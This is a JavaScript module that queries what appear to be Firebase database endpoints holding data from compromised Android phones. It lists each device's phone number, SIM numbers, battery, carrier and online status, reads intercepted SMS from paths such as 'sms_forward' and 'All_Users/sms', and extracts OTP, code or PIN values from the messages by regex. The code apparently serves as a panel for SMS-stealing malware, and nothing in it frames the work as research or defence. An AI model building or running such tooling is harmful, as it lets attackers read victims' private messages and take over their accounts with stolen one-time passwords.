export function cleanBase(url) {
  if (!url) return "";
  let u = String(url).trim().replace(/\/$/, "");
  u = u.replace(/\/\.json$/i, "").replace(/\.json$/i, "");
  if (!/^https?:\/\//i.test(u)) u = "https://" + u;
  return u;
}

export function fbUrl(base, path, auth) {
  const b = cleanBase(base);
  let p = path.startsWith("/") ? path.slice(1) : path;
  // support "messages/id?orderBy=..." 
  let query = "";
  if (p.includes("?")) {
    const i = p.indexOf("?");
    query = p.slice(i);
    p = p.slice(0, i);
  }
  if (!p.endsWith(".json")) p += ".json";
  let url = `${b}/${p}${query}`;
  if (auth) url += (url.includes("?") ? "&" : "?") + `auth=${encodeURIComponent(auth)}`;
  return url;
}

export async function fbGet(base, path, auth) {
  const url = fbUrl(base, path, auth);
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), 15000);
  try {
    const r = await fetch(url, { signal: ctrl.signal, cache: "no-store" });
    if (!r.ok) return { ok: false, status: r.status, data: null };
    const text = await r.text();
    if (!text || text === "null") return { ok: true, status: r.status, data: null };
    try {
      return { ok: true, status: r.status, data: JSON.parse(text) };
    } catch {
      return { ok: false, status: r.status, data: null };
    }
  } catch (e) {
    return { ok: false, status: 0, data: null, error: String(e.message || e) };
  } finally {
    clearTimeout(t);
  }
}

function validPhone(raw) {
  if (raw == null) return "";
  let s = String(raw).split(" - ")[0].split("/")[0].trim();
  s = s.replace(/\D/g, "");
  if (s.length >= 12 && s.startsWith("91")) s = s.slice(-10);
  if (s.length === 11 && s.startsWith("0")) s = s.slice(1);
  if (s.length === 10 && "6789".includes(s[0])) return s;
  return "";
}

export function extractPhone(dev) {
  if (!dev || typeof dev !== "object") return "";
  const keys = [
    "phoneNumber", "phone", "mobile", "mobNo", "number", "msisdn",
    "sim1Number", "sim2Number", "simNumber", "sim1", "sim2", "PhoneNumber", "line1Number",
  ];
  for (const k of keys) {
    const p = validPhone(dev[k]);
    if (p) return p;
  }
  // command.to sometimes holds number
  for (const k of ["command", "commands", "sendSms", "webhookEvent"]) {
    const sub = dev[k];
    if (sub && typeof sub === "object") {
      const p = extractPhone(sub) || validPhone(sub.to);
      if (p) return p;
      if (sub.sendSms) {
        const p2 = validPhone(sub.sendSms.to);
        if (p2) return p2;
      }
    }
  }
  const stack = [dev];
  let steps = 0;
  while (stack.length && steps < 60) {
    steps++;
    const cur = stack.pop();
    if (!cur || typeof cur !== "object") continue;
    for (const v of Object.values(cur)) {
      if (typeof v === "string" || typeof v === "number") {
        const p = validPhone(v);
        if (p) return p;
      } else if (v && typeof v === "object") stack.push(v);
    }
  }
  return "";
}

export function extractBattery(dev) {
  if (!dev || typeof dev !== "object") return null;
  for (const k of ["battery", "batteryLevel", "bat", "Battery"]) {
    if (dev[k] == null) continue;
    const n = parseInt(String(dev[k]).replace("%", ""), 10);
    if (!Number.isNaN(n) && n >= 0 && n <= 100) return n;
  }
  return null;
}

export function isOnline(dev) {
  if (!dev || typeof dev !== "object") return false;
  if (dev.status === true || dev.online === true || dev.isOnline === true) return true;
  if (dev.status === false) return false;
  if (typeof dev.status === "string") {
    const s = dev.status.toLowerCase();
    if (["online", "connected", "active"].includes(s)) return true;
    if (["offline", "disconnected", "inactive"].includes(s)) return false;
  }
  return false;
}

export function normalizeDevices(map) {
  if (!map || typeof map !== "object") return [];
  return Object.entries(map).map(([id, dev]) => {
    const d = dev && typeof dev === "object" ? dev : {};
    return {
      id,
      name: d.device_name || d.d_name || d.model || id.slice(0, 16),
      phone: extractPhone(d),
      battery: extractBattery(d),
      online: isOnline(d),
      android: d.android || d.osVersion || "",
      network: d.network || d.carrier || d.operator || "",
    };
  });
}

export function normalizeSms(node) {
  if (!node || typeof node !== "object") return [];
  const rows = [];
  for (const [key, entry] of Object.entries(node)) {
    if (!entry || typeof entry !== "object") continue;
    const body = String(entry.message || entry.body || entry.msg || entry.text || entry.content || "");
    if (!body) continue;
    const sender = String(entry.sender || entry.from || entry.address || entry.ph || "");
    const ts = String(entry.dateTime || entry.date || entry.timestamp || entry.time || key);
    const otp =
      (body.match(/(?:otp|code|pin)[^\d]{0,10}(\d{4,8})/i) || body.match(/\b(\d{4,8})\b/) || [])[1] ||
      null;
    rows.push({ key, body, sender, ts, otp });
  }
  rows.sort((a, b) => {
    const na = parseInt(String(a.key), 10);
    const nb = parseInt(String(b.key), 10);
    if (!Number.isNaN(na) && !Number.isNaN(nb)) return nb - na;
    return String(b.key).localeCompare(String(a.key));
  });
  return rows;
}

export function smsPaths(deviceId) {
  return [
    `messages/${deviceId}`,
    `user_sms/${deviceId}`,
    `sms/${deviceId}`,
    `sms_forward/${deviceId}`,
    `forwardSms/${deviceId}`,
    `All_Users/sms/${deviceId}`,
    `Sms/${deviceId}`,
  ];
}

/** Decode AnneBella-style ?s= base64 share param */
export function decodeShareParam(s) {
  try {
    const raw = Buffer.from(String(s), "base64").toString("utf8");
    // formats: url | url|||url | url||auth
    const parts = raw.split("|||");
    if (parts.length >= 1) {
      const url = cleanBase(parts[0].split("|")[0]);
      return url;
    }
  } catch {}
  return "";
}
